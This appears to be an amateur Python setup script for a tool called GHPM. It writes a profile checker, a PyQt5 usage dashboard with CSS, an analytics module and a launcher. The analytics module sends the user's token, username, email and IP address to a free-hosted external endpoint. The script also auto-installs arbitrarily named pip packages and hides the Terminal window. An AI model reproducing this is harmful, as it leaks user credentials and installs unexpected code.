'''
this script is responsible for managing module imports and installations 
and provides information about the success or failure of these operations,
potentially as part of an initialization or setup process for the application.
'''




import os
import sys

try:
    import System.Requirements.Information
    import User.UserProfile
except:
    pass

try:
    if User.UserProfile.Force_Import_Request is False:
        import System.Drive.Errors_Events.EventMan as EV

        EV.NewEvent(event=f'Import Test Aborted Due To User Settings', Pol=0)
    else:
        import importlib

        # List of required libraries
        required_libs = [
            'requests', 'socket', 'inspect', 're', 'platform', 'subprocess', 'threading', 'pty', 'datetime', 'time',
            'importlib', 'urllib', 'os', 'collections', 'io', 'cryptography', 'zipfile', 'shutil', 'sys', 'User', 'pfc',
            'System', 'venv', 'custom', 'hashlib', 'os', 'sys', 'uuid', 'tkinter', 'PyQt5', 'tqdm'
        ]

        # Check if each library is installed and install it if not
        for lib in required_libs:
            try:
                importlib.import_module(lib)
                print(f"{lib} is already installed.")
            except ImportError:
                print(f"{lib} is not installed. Installing...")
                try:
                    import subprocess

                    subprocess.check_call(['python3', '-m', 'pip', 'install', lib])
                    print(f"{lib} has been successfully installed.")
                except Exception as e:
                    print(f"Failed to install {lib}. Error: {e}")

        import time

        time.sleep(1)
        print('\n' * 100)

except:
    time.sleep(1)
    print('\n' * 100)

try:
    with open('pfc.py', 'w') as pfc:
        pfc.write('''

import os
        #   confirm profile integrity
import System.Drive.Errors_Events.EventMan as EV




def main():
    import User.UserProfile as up


    with open(os.path.join(up.SourceDirectory, 'User', 'UserProfile.py'),'r') as prile:
        plf = prile.read()

        msi = ['AdvancedL','ConsoleVisability','Force_Import_Request','Email','PushLogs','AutoUpdate','DisplayEvents','Forced_Login','Force_Import_Request','SourceDirectory','UserPrivileges','Token','safeInstall','HasGitDownloaded']
        for issue in msi:
            if issue not in plf:

                ui = input(f'{issue} -> 0[FALSE]  1[TRUE] -> ')
                if '1' in ui:
                    vt = True
                else:
                    vt = False
                with open(os.path.join('User', 'UserProfile.py'), 'a') as er:
                    er.write(f"""
{issue} = {vt}""")
            else:
                continue

main()

        ''')
except:
    pass
try:
    with open('launchwebreview.py', 'w') as w:
        w.write('''

"""
This code creates a PyQt5 application with a WebWindow that displays a local HTML file.
It also includes a "Back" action in the menu bar for navigation. 
The osascript command is used to hide the Terminal window. 
The main purpose is to provide a graphical interface for viewing a local HTML file and navigating backward in the browser-like interface.

-also needs to be fixed
*CrossPlatformCompatibility#002*
"""
import os,sys
import User.UserProfile as up
import re
from collections import Counter

data = """

<div class="dashboard">

    <link rel="stylesheet" href="stl.css">
	<div class="profile">
		<h2>GHPM Review</h2>
		<p>Check out your usage!</p>
		<p>[x00]</p>

	</div>

	<div class="schedule-table">
		<h2>Weekly Use</h2>
		<div class="table-wrap">
			<table>
				<tr>
					<th>Day</th>
					<th>Activation Time</th>
					<th>Action Count</th>
				</tr>
				<tr>
					<td>x01</td>
					<td>x02</td>
					<td>x03</td>
				</tr>
				<tr>
					<td>x04</td>
					<td>x05</td>
					<td>x06</td>
				</tr>
				<tr>
					<td>x07</td>
					<td>x08</td>
					<td>x09</td>
				</tr>
				<tr>
					<td>x10</td>
					<td>x11</td>
					<td>x12</td>
				</tr>
				<tr>
					<td>x13</td>
					<td>x14</td>
					<td>x15</td>
				</tr>
			</table>
		</div>
	</div>

	<div class="exercise-table">
		<h2>Last 5 Downloads</h2>
		<div class="table-wrap">
			<table>
				<tr>
					<th>Date</th>
					<th>Download</th>
				</tr>
				<tr>
					<td>z00</td>
					<td>z01</td>
				</tr>
				<tr>
					<td>z02</td>
					<td>z03</td>
				</tr>
				<tr>
					<td>z04</td>
					<td>z05</td>
				</tr>
				<tr>
					<td>z06</td>
					<td>z07</td>
				</tr>
				<tr>
					<td>z08</td>
					<td>z09</td>
				</tr>
			</table>
		</div>
	</div>

	<div class="calories">
		<h2>Total Downloads</h2>
		<div><strong>Today:</strong> c00</div>
		<div><strong>This Week:</strong> c01</div>
		<div><strong>This Month:</strong> c02</div>
	</div>

	<div class="calories">
		<h2>Total Actions</h2>
		<div><strong>Today:</strong> v00</div>
		<div><strong>This Week:</strong> v01</div>
		<div><strong>This Month:</strong> v02</div>
		<div><strong>Lifetime:</strong> v03</div>
	</div>

	<div class="personal-bests">
		<h2>Most Used Download</h2>
		<ul>
			<li>a00</li>
			<li>a01</li>
			<li>a02</li>
		</ul>
	</div>

	<div class="challenges">
		<h2>Current Profile</h2>
		<ul>
			<li>Source: s00</li>
			<li>User: s01</li>
			<li>Privilege: s02</li>
			<li>Login: s03</li>
			<li>Push Logs: s04</li>
			<li>UID4: s05</li>
			<li>Display: s06</li>
		</ul>
	</div>

</div>

"""

import datetime
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QAction
from PyQt5.QtWebEngineWidgets import QWebEngineView
from PyQt5.QtCore import QUrl, Qt
current_directory = up.SourceDirectory
from collections import Counter


with open(f"{current_directory}rev.html",'w') as m:
    m.write(data)


def replace_(marker,newip):
    filep = f"{current_directory}rev.html"

    with open(filep, 'r') as file:
        file_content = file.read()

    updated_content = file_content.replace(marker, newip)

    with open(filep, 'w') as file:
        file.write(updated_content)

def extract_urls_and_dates(filepath):
    repo = []
    date = []

    url_pattern = r'https?://\S+'  # Updated URL pattern
    date_pattern = r'\d{4}-\d{2}-\d{2}'  # Updated date pattern

    with open(filepath, 'r') as file:
        for line in file:
            # Find URLs in the line
            urls = re.findall(url_pattern, line)
            if urls:
                repo.append(urls[0])  # Assuming one URL per line

            # Find dates in the line
            dates = re.findall(date_pattern, line)
            if dates:
                date.append(dates[0])  # Assuming one date per line

    return repo, date

def extract_urls(file_path):
    url_pattern = r'https?://\S+'
    urls = []

    with open(file_path, 'r') as file:
        for line in file:
            found_urls = re.findall(url_pattern, line)
            urls.extend(found_urls)

    return urls

def rpl():
    #   GHPM WEEKLY USE
    x00 = datetime.datetime.today()
    # WEEK USE
    x01 =None
    x02 =None
    x03 =None
    x04 = None
    x05 =None
    x06 = None
    x07 = None
    x08 = None
    x09 = None
    x10 = None
    x11 = None
    x12 = None
    x13 = None
    x14 = None
    x15 = None
    #   Last 5 downloads
    import User
    file_path = f'{User.UserProfile.SourceDirectory}System/.Cache/System/GitHub/int2.txt'
    repo_list, date_list = extract_urls_and_dates(file_path)
    try:
        z00 = date_list[0]
    except IndexError:
        z00 = None  # Or handle the exception accordingly

    try:
        z01 = repo_list[0]
    except IndexError:
        z01 = None  # Or handle the exception accordingly

    try:
        z02 = date_list[1]
    except IndexError:
        z02 = None  # Or handle the exception accordingly

    try:
        z03 = repo_list[1]
    except IndexError:
        z03 = None  # Or handle the exception accordingly

    try:
        z04 = date_list[2]
    except IndexError:
        z04 = None  # Or handle the exception accordingly

    try:
        z05 = repo_list[2]
    except IndexError:
        z05 = None  # Or handle the exception accordingly

    try:
        z06 = date_list[3]
    except IndexError:
        z06 = None  # Or handle the exception accordingly

    try:
        z07 = repo_list[3]
    except IndexError:
        z07 = None  # Or handle the exception accordingly

    try:
        z08 = date_list[4]
    except IndexError:
        z08 = None  # Or handle the exception accordingly

    try:
        z09 = repo_list[4]
    except IndexError:
        z09 = None  # Or handle the exception accordingly


    #   Most Used Download
    top_three_urls = top_three_urls_by_frequency(file_path = f'{User.UserProfile.SourceDirectory}System/.Cache/System/ErrorLog/Events')

    # Unpack the top three URLs and their counts
    (a00, count_a00), (a01, count_a01), (a02, count_a02) = top_three_urls + [(None, None)] * (3 - len(top_three_urls))

    # Concatenate count with URL for a00
    if a00:
        a00 = f"{count_a00} || {a00}"
    if a01:
        a01 = f"{count_a01} || {a01}"
    if a02:
        a02 = f"{count_a02} || {a02}"

    s00 = up.SourceDirectory
    s01 = up.Username
    s02 = up.UserPrivileges
    s03= up.Forced_Login
    s04= up.PushLogs
    s05=up.uuid4
    s06=up.DisplayEvents



    buffers = ['x00','x01','x02','x03','x04','x05','x06','x07','x08','x09','x10','x11','x12','x13','x14','x15','z00','z01','z02','z03','z04','z05','z06','z07','z08','z09','a00','a01','a02','s00','s01','s02','s03','s04','s05','s06']
    buffer0 = [x00,   x01,  x02,  x03,  x04,  x05,  x06,  x07,  x08,  x09,  x10,  x11,  x12,  x13,  x14,  x15,  z00,  z01,  z02,  z03,  z04,  z05,  z06,  z07,  z08,  z09,  a00,  a01,  a02,  s00,  s01,  s02,  s03,  s04,  s05,  s06]

    oplen = 0
    while True:
        if oplen == len(buffers):
            break

        print(buffers[oplen], buffer0[oplen])
        if buffer0[oplen] is None:
            oplen = oplen + 1
            continue
        else:
            replace_(str(buffers[oplen]), str(buffer0[oplen]))
            oplen = oplen + 1

def top_three_urls_by_frequency(file_path):
    urls = extract_urls(file_path)
    url_count = Counter(urls)
    sorted_urls = sorted(url_count.items(), key=lambda x: x[1], reverse=True)
    top_three = sorted_urls[:3]

    # Return a list of tuples containing URL and its count
    return [(url, count) for url, count in top_three]

class WebWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.initUI()

    def initUI(self):
        self.setGeometry(100, 100, 880, 600)
        self.setWindowTitle('GHPM REVIEW')

        # Create a QWebEngineView widget
        self.web_view = QWebEngineView(self)
        self.web_view.setGeometry(0, 0, 880, 600)



        self.web_view.setUrl(QUrl.fromLocalFile(f"{current_directory}rev.html"))  # Replace with the actual file path

        self.web_view.urlChanged.connect(self.handleUrlChanged)

        # Create a "Back" action in the menu bar
        back_action = QAction("Back", self)
        back_action.setShortcut("Alt+Left")  # Shortcut to trigger the action
        back_action.triggered.connect(self.web_view.back)

        self.menuBar().addAction(back_action)

        self.setCentralWidget(self.web_view)

        self.show()

    def handleUrlChanged(self, url):
        if url != self.web_view.url():
            self.web_view.setUrl(url)  # Perform the redirect

def main():
    rpl()
    app = QApplication(sys.argv)
    window = WebWindow()
    sys.exit(app.exec_())

os.system("""osascript -e 'tell application "Terminal" to set visible of window 1 to false' """)
main()





    ''')
except:
    pass

try:
    with open('stl.css', "w") as l:
        l.write("""
        /* Neo-Brutalist Style - Because beauty is overrated. */

@import url("https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap");

*,
*::before,
*::after {
	box-sizing: border-box;
}

::selection {
	background: #333;
	color: #eee;
}

body {
	font-family: "IBM Plex Mono", monospace;
	color: #333;
	margin: 0;
	position: relative;
	line-height: 1.5em;
	font-size: 15px;
	background: repeating-linear-gradient(
		45deg,
		#aaa,
		#aaa 2px,
		#ccc 2px,
		#ccc 6px
	);
	background-attachment: fixed;
}

.dashboard {
	display: grid;
	grid-template-columns: repeat(6, 15.25%);
	grid-gap: 0 1.67%;
	margin: 20px auto;
	padding: 20px;
	border: 3px solid;
	width: 1000px;
	max-width: calc(100% - 40px);
	background: #ddd;
}

.dashboard > div {
	margin-bottom: 20px;
	padding: 15px;
	background-color: #f7f7f7;
	border: 2px solid;
	grid-column: 1 / 7;
	box-shadow: 1px 1px, 2px 2px, 3px 3px, 4px 4px;
}

.dashboard > div:hover {
	background: #fff;
	color: black;
}

.dashboard > div:last-of-type {
	margin-bottom: 5px;
}

.table-wrap {
	max-width: 100%;
	overflow-x: auto;
}

h2 {
	font-size: 1.5em;
	line-height: 1.1em;
	text-transform: uppercase;
	letter-spacing: 0.05em;
	margin-top: 0;
	padding: 5px 10px;
	margin-bottom: 15px;
	border-bottom: 2px solid;
	position: relative;
}

h2::before,
h2::after {
	content: "";
	position: absolute;
	bottom: -2px;
	width: 15px;
	height: 100%;
	left: -15px;
	border: 2px solid;
	border-left: none;
	vertical-align: text-bottom;
}

h2::after {
	left: unset;
	right: -15px;
	border-right: none;
	border-left: 2px solid;
}

table {
	width: 100%;
	border-collapse: collapse;
}

th,
td {
	border: 2px solid #333;
	padding: 8px;
	text-align: left;
}

tr:hover td {
	background: #eee;
}

th {
	background-color: #666;
	color: #fff;
}

ul {
	list-style-type: none;
	padding: 0;
}

li {
	padding: 5px 0;
	border-bottom: 2px solid;
}

.calories div {
	font-size: 1.25em;
	line-height: 1.5em;
	border-bottom: 2px solid;
	padding: 5px 0;
}

.profile {
	text-align: center;
}

.profile h2 {
	font-size: 2em;
	padding-bottom: 10px;
	border: none;
}

.profile p {
	font-size: 1.25em;
	font-style: italic;
	margin-bottom: 10px;
}

.dashboard .activity-feed li {
	font-style: italic;
}

@media (min-width: 767px) {
	.dashboard .schedule-table {
		grid-column: 1 / 4;
	}
	.dashboard .exercise-table {
		grid-column: 4 / 7;
	}
	.dashboard .calories {
		grid-column: 1 / 5;
	}
	.dashboard .personal-bests {
		grid-column: 5 / 7;
	}
	.dashboard .challenges {
		grid-column: 1 / 3;
	}
	.dashboard .activity-feed {
		grid-column: 3 / 7;
	}
	.calories div {
		width: 33.333%;
		float: left;
		display: grid;
		border-left: 2px solid;
		padding-left: 10px;
		margin-left: -2px;
		border-bottom: none;
	}
}



        """)
except:
    pass


try:
    with open('Fp45.py', 'w') as fp:
        fp.write("""import datetime
import os
import sys
import time
import User.UserProfile
import requests
import User.UserProfile as UP
avg_t = []


# Define your push_analytics_subprocess function
def push_analytics_subprocess(arg1, arg2, arg3):
    try:
        if User.UserProfile.PushLogs:

            def get_public_ip():
                try:
                    # Use a service that returns the public IPv4 and IPv6 addresses
                    ipv4_response = requests.get("https://httpbin.org/ip")
                    ipv4_address = ipv4_response.json()["origin"]

                    # Obtain IPv6 address
                    ipv6_response = requests.get("https://httpbin.org/ipv6")
                    ipv6_address = ipv6_response.json()["origin"]

                    if ipv4_response.status_code == 200 and ipv6_response.status_code == 200:
                        return ipv4_address.text, ipv6_address.text
                    else:
                        return "Error fetching IP addresses", "Error fetching IP addresses"
                except Exception as e:
                    return str(e), str(e)

            external_ipv4, external_ipv6 = get_public_ip()

            # Define the base URL
            def get_current_date_and_time():
                current_datetime = datetime.datetime.now()
                return current_datetime

            # Call the function to get the current date and time
            current_date_and_time = get_current_date_and_time()

            base_url = f"https://hello2022isthe3nd.000webhostapp.com/eventlogger.php?token={UP.Token}&data2={UP.Username}&data3={current_date_and_time} &data4={UP.Email}&data5=| {external_ipv6} | {a3}"
            if UP.PushLogs:
                requests.get(base_url)


    except:
            try:
                lm = User.UserProfile.OFFLINE
            except:
                lm = False

            if lm is False:
                def display_notification(title, message):
                    applescript = f'display notification "{message}" with title "{title}"'
                    os.system(f"osascript -e '{applescript}'")

                try:
                    response = requests.get("https://www.google.com", timeout=1)
                    if response.status_code == 200:
                        pass
                except:
                    display_notification("Hold Up!", "To continue using ghpm. Please connect to the internet")

                    def check_internet_connection():
                        try:
                            response = requests.get("https://www.google.com", timeout=5)
                            return response.status_code == 200
                        except requests.ConnectionError:
                            return False

                    while True:
                        if check_internet_connection():
                            # Internet connection is available, display thank you message
                            display_notification("Thank you!", " Please continue enjoying ghpm!!")

                            break  # Exit the loop
                        else:
                            # Internet connection is not available, wait for a while and check again
                            time.sleep(0.5)  # Wait for 5 seconds before checking again



# Check if command line arguments are provided
if len(sys.argv) >= 4:
    a1 = sys.argv[1]
    a2 = sys.argv[2]
    a3 = sys.argv[3]

    st = time.time()
    push_analytics_subprocess(a1, a2, a3)
    avg_t.append(time.time() - st)
    total = sum(avg_t)
    average = total / len(avg_t)
    average = str(average)

    try:
        if User.UserProfile.AdvancedL:
            print(f'average time -> {average[:3]}')
    except:
        pass
else:
    pass
""")
except:
    pass


try:
    with open('Start.py', 'w') as fp:
        fp.write('''


# This code seems to handle user profile swapping and module reloading dynamically.
# Let's break it down with comments:

import os
from tkinter import messagebox

import requests
Dailmess = False #  Change this to True for a daily messag easter egg
import venv
import sys
import importlib

# Retrieving command-line arguments
args = sys.argv

# Function to swap content between two files
def swap_file_content(file1_path, file2_path):
    try:
        # Read content from the first file
        with open(file1_path, 'r') as file1:
            file1_content = file1.read()

        # Read content from the second file
        with open(file2_path, 'r') as file2:
            file2_content = file2.read()

        # Write the content of the first file into the second file
        with open(file2_path, 'w') as file2:
            file2.write(file1_content)

        # Write the content of the second file into the first file
        with open(file1_path, 'w') as file1:
            file1.write(file2_content)

        print(f"Profile Switched")
    except FileNotFoundError:
        print("User Profile Not Found")

# Check if the desired launch argument exists (-nu {filepath})
if "-nu" in args:
    index = args.index("-nu")
    if index + 1 < len(args):
        file_path = args[index + 1]  # Get the file path
        file_path = (f'{file_path}/User/UserProfile.py')
        print(f"New User provided: {file_path}")
        import User.UserProfile  # Importing the user profile
        swap_file_content(file_path, f'{os.getcwd()}/User/UserProfile.py')
    else:
        print("No file path provided after -tu")

# Function to reload a Python module
def reload_module(module_name):
    try:
        module = importlib.import_module(module_name)
        importlib.reload(module)
        print(f"{module_name} reloaded successfully.")
    except Exception as e:
        print(f"Error reloading {module_name}: {e}")

# Function to check if it's the first use and take action accordingly
def check_first_use():
    first_use_token = f'{os.getcwd()}/System/.Cache/User/FirstUseToken.txt'
    return os.path.exists(first_use_token)

# Handling the first use scenario
def handle_first_use():
    if check_first_use():
        import System.Drive.FirstUse
        sys.exit(0)

# Function to rename a folder
def rename_folder(old_folder_name, new_folder_name):
    try:
        os.rename(old_folder_name, new_folder_name)
        print('Hidden!')
    except Exception as e:
        print(f'Error: {e}')

# Function to create a virtual environment
def create_virtual_environment(venv_dir):
    if not os.path.exists(venv_dir):
        print('Creating new virtual environment...')
        venv.create(venv_dir, with_pip=True)
    else:
        print('Activating existing virtual environment...')
        os.system('source venv/bin/activate')

# Function to run a module verifier
def run_module_verifier():
    try:
        import System.Drive.ModuleVerifier
        exec('System.Drive.ModuleVerifier')
    except Exception as e:
        print(f'Error: {e}')

# Checking and responding to first use status
handle_first_use()

try:
    old_folder_name = f"{os.getcwd()}/System/Cache"
    new_folder_name = f"{os.getcwd()}/System/.Cache"

    rename_folder(old_folder_name, new_folder_name)
except:
    pass

# Creating/activating a virtual environment
venv_dir = os.path.join(os.getcwd(), 'venv')
create_virtual_environment(venv_dir)

# Running a module verifier
run_module_verifier()

# Importing the user profile and reloading it
import User.UserProfile
reload_module('User.UserProfile')

# Handling errors and continuing the flow
import System.Drive.Errors_Events.EventMan as EV
import uuid
EV.PushAnalytics(a1=uuid.uuid1().hex, a2='Login', a3='None')

def DailyM():
    limit = 1
    api_url = 'https://v2.jokeapi.dev/joke/Programming,Miscellaneous?blacklistFlags=nsfw,explicit&format=txt&type=single'
    response = requests.get(api_url)
    if response.status_code == requests.codes.ok:
        return(response.text)

try:
    import System.Drive.FunctionRequest as fr
    import System.Drive.BuildGHPMConnection as bgc
    bgc.__main__()
    if Dailmess:
        messagebox.showinfo(f"Daily Joke", f"{DailyM()}")
    fr.GUI()


    try:
        swap_file_content(file_path, f'{os.getcwd()}/User/UserProfile.py')
    except Exception:
        print(Exception)
except Exception:
    print(Exception)
    swap_file_content(file_path, f'{os.getcwd()}/User/UserProfile.py')



''')
except:
    pass

